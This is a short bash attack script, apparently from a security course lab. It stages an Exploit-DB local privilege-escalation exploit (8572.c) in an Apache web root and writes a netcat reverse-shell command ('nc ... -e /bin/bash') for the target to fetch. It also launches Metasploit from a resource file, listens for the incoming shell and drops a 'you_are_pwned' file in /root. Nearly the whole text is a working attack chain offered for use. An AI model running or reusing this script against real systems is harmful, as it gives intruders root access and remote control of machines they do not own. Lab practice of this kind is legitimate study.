#!/bin/bash
# bash attack.sh 192.168.23.132

# Check if an IP address is provided
if [ -z "$1" ]; then
    echo "Usage: $0 [IP address]"
    exit 1
fi

# Assign the first argument to a variable
TARGET_IP="$1"

service apache2 restart
sudo ln -s /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/
# Open nano editor to create or edit the file /var/www/html/run
sudo touch /var/www/html/run
# Write the netcat command to the file
echo "#!/bin/bash" > /var/www/html/run
sudo bash -c "echo 'nc $TARGET_IP 12345 -e /bin/bash' >> /var/www/html/run"

# Make the file executable
sudo chmod +x /var/www/html/run
# run on background
(
msfconsole -r script.rc
) &

nc -lvp 12345
sleep 30
echo "cs230 1337 haxx0r" > /root/you_are_pwned
